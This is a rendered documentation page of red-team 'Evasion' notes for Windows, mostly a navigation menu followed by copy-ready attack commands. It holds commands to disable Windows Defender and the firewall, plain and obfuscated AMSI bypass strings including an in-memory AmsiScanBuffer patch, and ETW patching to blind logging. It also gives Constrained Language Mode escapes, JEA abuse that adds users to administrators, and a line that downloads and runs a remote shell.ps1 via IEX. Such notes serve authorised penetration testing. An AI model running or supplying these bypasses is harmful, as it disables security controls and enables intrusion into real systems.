          <li class="md-nav__item">
  <a href="#regexe-dumping-sam" class="md-nav__link">
    <span class="md-ellipsis">
      Reg.exe dumping sam
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rundll32exe-dll-payload" class="md-nav__link">
    <span class="md-ellipsis">
      rundll32.exe dll payload
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#msbuiltexe" class="md-nav__link">
    <span class="md-ellipsis">
      Msbuilt.exe
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Msbuilt.exe">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-shellcode-injector" class="md-nav__link">
    <span class="md-ellipsis">
      Example shellcode injector
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-powershell-clm" class="md-nav__link">
    <span class="md-ellipsis">
      Example PowerShell clm
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lsass-protections" class="md-nav__link">
    <span class="md-ellipsis">
      LSASS Protections
    </span>
  </a>
  
    <nav class="md-nav" aria-label="LSASS Protections">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#credential-guard" class="md-nav__link">
    <span class="md-ellipsis">
      Credential Guard
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Credential Guard">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-credential-guard-is-configured" class="md-nav__link">
    <span class="md-ellipsis">
      Check if credential guard is configured
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-credential-guard-is-running" class="md-nav__link">
    <span class="md-ellipsis">
      Check if credential guard is running
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#runasppl" class="md-nav__link">
    <span class="md-ellipsis">
      RunasPPL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="RunasPPL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-if-runasppl-is-configured" class="md-nav__link">
    <span class="md-ellipsis">
      Check if RunasPPL is configured
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defeating-av" class="md-nav__link">
    <span class="md-ellipsis">
      Defeating AV
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Defeating AV">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#general_1" class="md-nav__link">
    <span class="md-ellipsis">
      General
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#obfuscation-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Obfuscation tools
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Obfuscation tools">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#c-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      C# binaries
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#go-binaries" class="md-nav__link">
    <span class="md-ellipsis">
      Go binaries
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell_1" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#evasion-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      Evasion techniques
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Evasion techniques">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#things-that-get-you-caught" class="md-nav__link">
    <span class="md-ellipsis">
      Things that get you caught
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#how-amsi-evaluates-powershell-commands" class="md-nav__link">
    <span class="md-ellipsis">
      How amsi evaluates PowerShell commands
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-the-following-in-scriptscode" class="md-nav__link">
    <span class="md-ellipsis">
      Change the following in scripts/code
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Change the following in scripts/code">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hash-of-filecode" class="md-nav__link">
    <span class="md-ellipsis">
      Hash of file/code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#byte-strings" class="md-nav__link">
    <span class="md-ellipsis">
      Byte strings
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#structure-of-the-code" class="md-nav__link">
    <span class="md-ellipsis">
      Structure of the code
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-of-changing-amsi-bypass-string" class="md-nav__link">
    <span class="md-ellipsis">
      Example of changing amsi bypass string
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#defeating-microsoft-defender" class="md-nav__link">
    <span class="md-ellipsis">
      Defeating Microsoft Defender
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#scanning-amsi" class="md-nav__link">
    <span class="md-ellipsis">
      Scanning amsi
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Scanning amsi">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#threatcheck" class="md-nav__link">
    <span class="md-ellipsis">
      Threatcheck
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#amsitrigger" class="md-nav__link">
    <span class="md-ellipsis">
      AmsiTrigger
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#offensive-net" class="md-nav__link">
    <span class="md-ellipsis">
      Offensive .NET
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Offensive .NET">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#use-custom-exe-assembyload-to-run-netloader-in-memory-and-then-load-binary" class="md-nav__link">
    <span class="md-ellipsis">
      Use custom exe Assembyload to run netloader in memory and then load binary
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#random-notes" class="md-nav__link">
    <span class="md-ellipsis">
      Random notes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#windows-subsystem-for-linux-wsl" class="md-nav__link">
    <span class="md-ellipsis">
      Windows Subsystem for Linux WSL
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows Subsystem for Linux WSL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#netcat-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Netcat shell
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bypass-whitelisting" class="md-nav__link">
    <span class="md-ellipsis">
      Bypass whitelisting
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Privileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-current-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Check current privileges
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sedebugprivileges" class="md-nav__link">
    <span class="md-ellipsis">
      SeDebugPrivileges
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SeDebugPrivileges">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#export-the-current-user-rights-set-by-the-group-policies-to-a-text-file" class="md-nav__link">
    <span class="md-ellipsis">
      Export the current user rights set by the group policies to a text file:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#edit-the-secpolicying" class="md-nav__link">
    <span class="md-ellipsis">
      Edit the secpolicy.ing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#save-the-new-user-rights-set" class="md-nav__link">
    <span class="md-ellipsis">
      Save the new user rights set
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#start-cmd-again" class="md-nav__link">
    <span class="md-ellipsis">
      Start cmd again
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#uac-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      UAC bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="UAC bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#automatec-uac-bypass-powershell-script" class="md-nav__link">
    <span class="md-ellipsis">
      Automatec UAC bypass PowerShell script
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#manual-uac-bypass" class="md-nav__link">
    <span class="md-ellipsis">
      Manual UAC bypass
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Manual UAC bypass">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#fodhelper" class="md-nav__link">
    <span class="md-ellipsis">
      Fodhelper
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-current-uac-configuration" class="md-nav__link">
    <span class="md-ellipsis">
      Check current UAC configuration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="evasion">Evasion</h1>
<h2 id="general">General</h2>
<h3 id="enumerating-av-edr">Enumerating AV / EDR</h3>
<ul>
<li>https://github.com/tothi/serviceDetector
<div class="highlight"><pre><span></span><code>python3 serviceDetector.py -conf conf/edr.json &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;
</code></pre></div></li>
</ul>
<h4 id="run-against-multiple-targets">Run against multiple targets</h4>
<div class="highlight"><pre><span></span><code>cat targets.txt | parallel -j 50 python3 serviceDetector.py -conf conf/edr.json &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;
</code></pre></div>
<h4 id="get-all-gpos-applied-to-a-machine">Get all GPO's applied to a machine</h4>
<ul>
<li>Run with elevated prompt
<div class="highlight"><pre><span></span><code>gpresult /H gpos.html
</code></pre></div></li>
</ul>
<h2 id="windows-defender">Windows Defender</h2>
<ul>
<li>Detects On-disk, In-Memory (AMSI) and Behavioural</li>
</ul>
<h4 id="check-if-windows-defender-is-running">Check if windows defender is running</h4>
<div class="highlight"><pre><span></span><code>Get-MpComputerStatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled
</code></pre></div>
<h4 id="get-info-about-windows-defender">Get info about Windows Defender</h4>
<div class="highlight"><pre><span></span><code>Get-MpPreference
</code></pre></div>
<h4 id="find-excluded-folder-from-windows-defender">Find excluded folder from Windows Defender</h4>
<div class="highlight"><pre><span></span><code>Get-MpPreference | select Exclusion*
(Get-MpPreference).Exclusionpath
</code></pre></div>
<h4 id="script-to-dump-mde-config-asr-rules">Script to dump MDE config / ASR rules</h4>
<ul>
<li>https://github.com/BlackSnufkin/Invoke-DumpMDEConfig?tab=readme-ov-file</li>
</ul>
<h4 id="create-exclusion">Create exclusion</h4>
<div class="highlight"><pre><span></span><code>Set-MpPreference -ExclusionPath &quot;&lt;path&gt;&quot;
</code></pre></div>
<h4 id="check-av-detections">Check AV Detections</h4>
<div class="highlight"><pre><span></span><code>Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime 
</code></pre></div>
<h4 id="get-last-av-detection">Get last AV Detection</h4>
<div class="highlight"><pre><span></span><code>Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime | Select-Object -First 1
</code></pre></div>
<h4 id="disable-av-monitoring">Disable AV monitoring</h4>
<div class="highlight"><pre><span></span><code>Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPReference -DisableIOAVProtection $true

powershell.exe -c &#39;Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true&#39;
</code></pre></div>
<h3 id="asr-rules">ASR Rules</h3>
<h4 id="enumerate-asr-rules">Enumerate ASR rules</h4>
<ul>
<li>https://github.com/directorcia/Office365/blob/master/win10-asr-get.ps1
<div class="highlight"><pre><span></span><code>. ./win10-asr-get.ps1
</code></pre></div></li>
</ul>
<h2 id="windows-firewall">Windows Firewall</h2>
<h4 id="get-state">Get state</h4>
<div class="highlight"><pre><span></span><code>Get-NetFirewallProfile -PolicyStore ActiveStore
</code></pre></div>
<h4 id="get-rules">Get rules</h4>
<div class="highlight"><pre><span></span><code>Get-netfirewallrule | format-table name,displaygroup,action,direction,enabled -autosize
</code></pre></div>
<h4 id="disable-firewall">Disable Firewall</h4>
<div class="highlight"><pre><span></span><code>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
</code></pre></div>
<h4 id="enable-firewall">Enable firewall</h4>
<div class="highlight"><pre><span></span><code>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
</code></pre></div>
<h4 id="change-default-policy">Change default policy</h4>
<div class="highlight"><pre><span></span><code>Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow 
</code></pre></div>
<h4 id="open-port-on-firewall">Open port on firewall</h4>
<div class="highlight"><pre><span></span><code>netsh advfirewall firewall add rule name=&quot;Allow port&quot; dir=in action=allow protocol=TCP localport=&lt;PORT&gt;

New-NetFirewallRule -DisplayName &quot;Allow port&quot; -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort &lt;PORT&gt;
</code></pre></div>
<h4 id="remove-firewall-rule">Remove firewall rule</h4>
<div class="highlight"><pre><span></span><code>Remove-NetFirewallRule -DisplayName &quot;Allow port&quot;
</code></pre></div>
<h2 id="powershell">PowerShell</h2>
<h4 id="powershell-detections">Powershell detections</h4>
<ul>
<li>System-wide transcription</li>
<li>Script Block logging </li>
<li>Module logging</li>
<li>AntiMalware Scan Interface (AMSI)</li>
<li>Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)</li>
</ul>
<h3 id="start-64-bit-powershell">Start 64 bit powershell</h3>
<div class="highlight"><pre><span></span><code>%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
</code></pre></div>
<h3 id="execution-policy">Execution-policy</h3>
<ul>
<li>It is not a security boundary.</li>
</ul>
<h4 id="get-execution-policy">Get Execution policy</h4>
<div class="highlight"><pre><span></span><code>Get-Executionpolicy
</code></pre></div>
<h4 id="bypass-execution-policy">Bypass execution policy</h4>
<ul>
<li>Not meant to be a security measure
<div class="highlight"><pre><span></span><code>powershell –executionpolicy bypass .\script.ps1
powershell –c &lt;cmd&gt;
powershell –enc
powershell.exe -executionpolicy bypass
</code></pre></div></li>
</ul>
<h3 id="amsi">AMSI</h3>
<ul>
<li>https://amsi.fail/</li>
<li>Get an AMSI bypass string and then obfuscate <a href="#Obfuscation-techniques">manually</a></li>
</ul>
<h4 id="amsi-bypass-string">AMSI bypass string</h4>
<div class="highlight"><pre><span></span><code>[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).SetValue($null,$true)
</code></pre></div>
<h4 id="amsi-bypass-string-obfuscated">AMSI bypass string obfuscated</h4>
<div class="highlight"><pre><span></span><code>S`eT-It`em ( &#39;V&#39;+&#39;aR&#39; +  &#39;IA&#39; + (&#39;blE:1&#39;+&#39;q2&#39;)  + (&#39;uZ&#39;+&#39;x&#39;)  ) ( [TYpE](  &quot;{1}{0}&quot;-F&#39;F&#39;,&#39;rE&#39;  ) )  ;    (    Get-varI`A`BLE  ( (&#39;1Q&#39;+&#39;2U&#39;)  +&#39;zX&#39;  )  -VaL  ).&quot;A`ss`Embly&quot;.&quot;GET`TY`Pe&quot;((  &quot;{6}{3}{1}{4}{2}{0}{5}&quot; -f(&#39;Uti&#39;+&#39;l&#39;),&#39;A&#39;,(&#39;Am&#39;+&#39;si&#39;),(&#39;.Man&#39;+&#39;age&#39;+&#39;men&#39;+&#39;t.&#39;),(&#39;u&#39;+&#39;to&#39;+&#39;mation.&#39;),&#39;s&#39;,(&#39;Syst&#39;+&#39;em&#39;)  ) ).&quot;g`etf`iElD&quot;(  ( &quot;{0}{2}{1}&quot; -f(&#39;a&#39;+&#39;msi&#39;),&#39;d&#39;,(&#39;I&#39;+&#39;nitF&#39;+&#39;aile&#39;)  ),(  &quot;{2}{4}{0}{1}{3}&quot; -f (&#39;S&#39;+&#39;tat&#39;),&#39;i&#39;,(&#39;Non&#39;+&#39;Publ&#39;+&#39;i&#39;),&#39;c&#39;,&#39;c,&#39;  )).&quot;sE`T`VaLUE&quot;(  ${n`ULl},${t`RuE} )
</code></pre></div>
<div class="highlight"><pre><span></span><code>$v=[Ref].Assembly.GetType(&#39;System.Management.Automation.Am&#39; + &#39;siUtils&#39;); $v.&quot;Get`Fie`ld&quot;(&#39;ams&#39; + &#39;iInitFailed&#39;,&#39;NonPublic,Static&#39;).&quot;Set`Val`ue&quot;($null,$true)
</code></pre></div>
<h4 id="amsi-bypass-string-2-obfuscated">AMSI bypass string 2 obfuscated</h4>
<div class="highlight"><pre><span></span><code>$MethodDefinition = @&quot;
[DllImport(`&quot;kernel32`&quot;,  EntryPoint=&quot;GetProcAddress&quot;)]
public static extern IntPtr GetProc(IntPtr hModule, string procName);

[DllImport(`&quot;kernel32`&quot;)]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport(`&quot;kernel32`&quot;,EntryPoint=&quot;VirtualProtect&quot; )]
public static extern bool Virtual(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
&quot;@;
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name &#39;Kern&#39; -NameSpace &#39;W&#39; -PassThru;
$ABSD = &#39;Ams&#39;+&#39;iS&#39;+&#39;canBuffer&#39;;
$handle = [W.Kern]::GetModuleHandle(&#39;ams&#39;+&#39;i.dll&#39;);
[IntPtr]$BAddress = [W.Kern]::GetProc($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$PFlag = 0x40;
[UInt32]$OFlag = 0;
[W.Kern]::Virtual($BAddress, $Size, $PFlag, [Ref]$OFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
[system.runtime.interopservices.marshal]::copy($buf, 0, $BAddress, 6);
</code></pre></div>
<h3 id="etw">ETW</h3>
<ul>
<li>Event Tracing for Windows</li>
<li>Very effective way of hunting .NET</li>
<li>Reflectivly modify the PowerShell process to prevent events being published. ETW feeds ALL of the other logs so this disabled everything!</li>
<li>Also bypasses scriptblock logging</li>
</ul>
<div class="highlight"><pre><span></span><code>[Ref].Assembly.GetType(&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;).GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);
</code></pre></div>
<h4 id="obfusacted">Obfusacted</h4>
<div class="highlight"><pre><span></span><code>[Reflection.Assembly]::&quot;l`o`AdwIThPa`Rti`AlnamE&quot;((&#39;S&#39;+&#39;ystem&#39;+&#39;.C&#39;+&#39;ore&#39;)).&quot;g`E`TTYPE&quot;((&#39;Sys&#39;+&#39;tem.Di&#39;+&#39;agno&#39;+&#39;stics.Event&#39;+&#39;i&#39;+&#39;ng.EventProv&#39;+&#39;i&#39;+&#39;der&#39;)).&quot;gET`FI`eLd&quot;((&#39;m&#39;+&#39;_&#39;+&#39;enabled&#39;),(&#39;NonP&#39;+&#39;ubl&#39;+&#39;ic&#39;+&#39;,Instance&#39;)).&quot;seTVa`l`Ue&quot;([Ref].&quot;a`sSem`BlY&quot;.&quot;gE`T`TyPE&quot;((&#39;Sys&#39;+&#39;tem&#39;+&#39;.Mana&#39;+&#39;ge&#39;+&#39;ment.Aut&#39;+&#39;o&#39;+&#39;mation.Tracing.&#39;+&#39;PSEtwLo&#39;+&#39;g&#39;+&#39;Pro&#39;+&#39;vi&#39;+&#39;der&#39;)).&quot;gEtFIe`Ld&quot;((&#39;e&#39;+&#39;tw&#39;+&#39;Provid&#39;+&#39;er&#39;),(&#39;N&#39;+&#39;o&#39;+&#39;nPu&#39;+&#39;b&#39;+&#39;lic,Static&#39;)).&quot;gE`Tva`lUe&quot;($null),0)
</code></pre></div>
<h3 id="constrained-lanuage-mode">Constrained Lanuage Mode</h3>
<h4 id="check-the-language-mode">Check the language mode</h4>
<div class="highlight"><pre><span></span><code>$ExecutionContext.SessionState.LanguageMode
</code></pre></div>
<h3 id="escapes-for-constrained-language-mode">Escapes for Constrained Language Mode</h3>
<h4 id="launch-powershell-version-2">Launch Powershell Version 2</h4>
<div class="highlight"><pre><span></span><code>Powershell.exe -Version 2
</code></pre></div>
<h4 id="overwrite-__pslockdownpolicy-variable">Overwrite __PSLockdownPolicy variable</h4>
<ul>
<li>If CLM is not implemented correctly and is using __PSLockdownPolicy</li>
</ul>
<h4 id="check-the-__pslockdownpolicy-value">Check the __PSLockdownPolicy value</h4>
<ul>
<li>Value 4 is enabled</li>
<li>Value 8 is disabled
<div class="highlight"><pre><span></span><code>(Get-ItemProperty &#39;hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#39; -name &quot;__PSLockdownPolicy&quot;).__PSLockDownPolicy
</code></pre></div></li>
</ul>
<h4 id="set-lockdown-policy-to-8-and-check-language-mode">Set lockdown policy to 8 and check language mode</h4>
<ul>
<li>https://github.com/Metoraf007/Public_PowerShell/blob/master/Bypass_ConstrainedLang.ps1
<div class="highlight"><pre><span></span><code>Set-ItemProperty &#39;hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&#39; -name &quot;__PSLockdownPolicy&quot; -Value 8
powershell.exe
$ExecutionContext.SessionState.LanguageMode
</code></pre></div></li>
</ul>
<h3 id="powershx">PowerShx</h3>
<ul>
<li>https://github.com/iomoath/PowerShx
<div class="highlight"><pre><span></span><code>rundll32 PowerShx.dll,main -i 
PowerShx.exe -i  
</code></pre></div></li>
</ul>
<h3 id="powershdll-run-powershell-with-dlls-only">PowerShdll Run PowerShell with dlls only.</h3>
<ul>
<li>https://github.com/p3nt4/PowerShdll</li>
<li>Does not require access to powershell.exe as it uses powershell automation dlls.
<div class="highlight"><pre><span></span><code>rundll32 PowerShdll,main -i
</code></pre></div></li>
</ul>
<h4 id="download-files-with-certutil">Download files with certutil</h4>
<ul>
<li>You can not use iwr but you can use certutil in constrained language mode
<div class="highlight"><pre><span></span><code>certutil -urlcache -split -f &lt;URL&gt;
</code></pre></div></li>
</ul>
<h4 id="execute-scripts">Execute scripts</h4>
<ul>
<li>It is possible to execute scripts on the filesystem but you can't load them!</li>
<li>If applocker is there enumerate it to find a directory that lets you execute scripts in</li>
</ul>
<h3 id="logging-evasion">Logging evasion</h3>
<h4 id="invisi-shell">Invisi-shell</h4>
<ul>
<li>Bypasses all logging</li>
<li>https://github.com/OmerYa/Invisi-Shell</li>
<li>Type exit from the new PowerShell session to complete the clean-up.</li>
</ul>
<h4 id="with-admin-privileges">With admin privileges</h4>
<div class="highlight"><pre><span></span><code>./RunWithPathAsAdmin.bat 
</code></pre></div>
<h4 id="with-non-admin-privileges">With non-admin privileges:</h4>
<div class="highlight"><pre><span></span><code>RunWithRegistryNonAdmin.bat
</code></pre></div>
<h4 id="script-block-logging-bypass">Script Block logging bypass</h4>
<ul>
<li>Bypass <a href="#ETW">ETW</a></li>
</ul>
<h5 id="winrs">Winrs</h5>
<ul>
<li>Use Winrs instead of PSRemoting to evade System-wide-transcript and deep script block logging
<div class="highlight"><pre><span></span><code>winrs -remote:server1 -u:&lt;COMPUTERNAME&gt;\&lt;USER&gt; -p:&lt;PASS&gt; hostname
</code></pre></div></li>
</ul>
<h3 id="just-enough-admin">Just Enough Admin</h3>
<ul>
<li>Defines allowed cmdledt and commands that are allowed by defining role capabilities.</li>
</ul>
<h4 id="connect-with-jea-endpoint">Connect with JEA endpoint</h4>
<ul>
<li>Use <code>DOMAIN\USER</code> format
<div class="highlight"><pre><span></span><code>$creds = get-credential
$sess = New-PSSession -ComputerName &lt;FQDN&gt; -ConfigurationName &lt;JEA ENDPOINT CONF NAME&gt; -Credential $creds
</code></pre></div></li>
</ul>
<h4 id="get-the-pssession-configurations-and-jea">Get the PSSession configurations (and JEA)</h4>
<div class="highlight"><pre><span></span><code>Get-PSSessionconfiguration
</code></pre></div>
<h4 id="get-pssession-capabilities">Get PSSession capabilities</h4>
<div class="highlight"><pre><span></span><code>Get-PSSessionCapability -ConfigurationName &lt;NAME&gt; -Username &lt;DOMAIN&gt;\&lt;USERNAME&gt;
</code></pre></div>
<h3 id="abuse-jea">Abuse JEA</h3>
<ul>
<li>Only when its misconfigured and allows dangerous commands like net.exe or cmdlets like Start-Process or Start-Service.</li>
<li>Allows the use of wildcard.</li>
<li>Check which commands are allowed to run and google for abuses</li>
<li>https://www.triplesec.info/slides/3c567aac7cf04f8646bf126423393434.pdf
<div class="highlight"><pre><span></span><code>Get-Command

# Abuse example
Start-Process cmd.exe calc.exe
</code></pre></div></li>
</ul>
<h4 id="abuse-creating-functions">Abuse - Creating functions</h4>
<ul>
<li>If JEA enpoint is running in Constrained Language Mode instead of NoLanguage it is possible to create your own functions!</li>
<li>Creates a function with the name <code>gl</code> and executes it.</li>
<li>Shortcut would be <code>${ &lt;COMMAND&gt;}</code>
<div class="highlight"><pre><span></span><code>function gl {Get-Location}; gl

function gl {whoami}; gl

function gl {powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://&lt;IP&gt;/shell.ps1&#39;))&quot;}; gl
</code></pre></div></li>
</ul>
<h4 id="abuse-grant-a-user-to-admin">Abuse - Grant a user to admin</h4>
<div class="highlight"><pre><span></span><code>Add-ADGroupMember, Add-LocalGroupMember, net.exe, dsadd.exe
</code></pre></div>
<h4 id="abuse-running-arbritary-code">Abuse - Running arbritary code</h4>
<div class="highlight"><pre><span></span><code>Start-Process, New-Service, Invoke-Item, Invoke-WmiMethod, Invoke-Command,
New-ScheduledTask, Register-ScheduledJob

Invoke-Command -ScriptBlock {net localgroup administrators &lt;USER&gt; /add}
</code></pre></div>
<h3 id="abuse-set-pssessionconfiguration">Abuse - Set-PSSessionConfiguration</h3>
<ul>
<li>From https://github.com/samratashok/RACE/blob/master/RACE.ps1</li>
<li>After finding a profile to edit, can also edit <code>microsoft.powershell</code> which is the normal remoting endpoint!</li>
</ul>
<h4 id="connect-and-check-the-config">Connect and check the config</h4>
<div class="highlight"><pre><span></span><code>$sess = New-PSSession -ComputerName &lt;FQDN&gt; -Credential $creds -ConfigurationName &lt;ENDPOINT&gt;
Enter-PSSession $sess
Get-PSSessionConfiguration
</code></pre></div>
<h4 id="get-original-sddl">Get original SDDL</h4>
<div class="highlight"><pre><span></span><code>$existingSDDL = (Get-PSSessionConfiguration -Name &quot;&lt;PROFILE&gt;&quot; -Verbose:$false).SecurityDescriptorSDDL
</code></pre></div>
<h4 id="get-sid-for-new-user-to-add">Get SID  for new user to add</h4>
<div class="highlight"><pre><span></span><code>$SID = (Get-DomainUser &lt;USER&gt;).Objectsid
</code></pre></div>
<h4 id="create-new-sddl-with-a-new-user-sid">Create new SDDL with a new USER SID</h4>
<div class="highlight"><pre><span></span><code>$isContainer = $false  
$isDS = $false  
$SecurityDescriptor = New-Object -TypeName Security.AccessControl.CommonSecurityDescriptor -ArgumentList $isContainer,$isDS, $existingSDDL
$accessType = &quot;Allow&quot;  
$accessMask = 268435456  
$inheritanceFlags = &quot;none&quot;  
$propagationFlags = &quot;none&quot;  
$SecurityDescriptor.DiscretionaryAcl.AddAccess($accessType,$SID,$accessMask,$inheritanceFlags,$propagationFlags) | Out-Null
$newSDDL = $SecurityDescriptor.GetSddlForm(&quot;All&quot;)
$newSDDL
</code></pre></div>
<h4 id="change-the-config">Change the config</h4>
<div class="highlight"><pre><span></span><code>Set-PSSessionConfiguration -name &quot;&lt;PROFILE&gt;&quot; -SecurityDescriptorSddl &quot;&lt;SDDL&gt;&quot; -force -Confirm:$false
</code></pre></div>
<h4 id="reconnect-and-check-the-config">Reconnect and check the config</h4>
<div class="highlight"><pre><span></span><code>$sess = New-PSSession -ComputerName &lt;FQDN&gt; -Credential $creds -ConfigurationName &lt;ENDPOINT&gt;
Enter-PSSession $sess
Get-PSSessionConfiguration
</code></pre></div>
<h4 id="connect-to-reconfigured-new-endpoint">Connect to reconfigured new endpoint</h4>
<div class="highlight"><pre><span></span><code>$sess2 = New-PSSession -ComputerName &lt;FQDN&gt; -Credential $creds2 -ConfigurationName &lt;RECONFIGURED ENDPOINT&gt;
Enter-PSSession $sess
Get-PSSessionConfiguration
</code></pre></div>
<h2 id="applocker">Applocker</h2>
<ul>
<li>AppLocker rules are split into 5 categories - <code>Executable</code>, <code>Windows Installer</code>, <code>Script</code>, <code>Packaged App</code> and <code>DLLs</code>, and each category can have its own enforcement (enforced, audit only, none).</li>
<li>AppLocker has a set of default allow rules such as, <code>allow everyone to execute anything within C:\Windows\*</code> - the theory being that everything in <code>C:\Windows</code> is trusted and safe to execute.</li>
<li>The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:</li>
<li>Executing untrusted code via trusts LOLBAS's.</li>
<li>Finding writeable directories within "trusted" paths.</li>
<li>By default, AppLocker is not even applied to Administrators.</li>
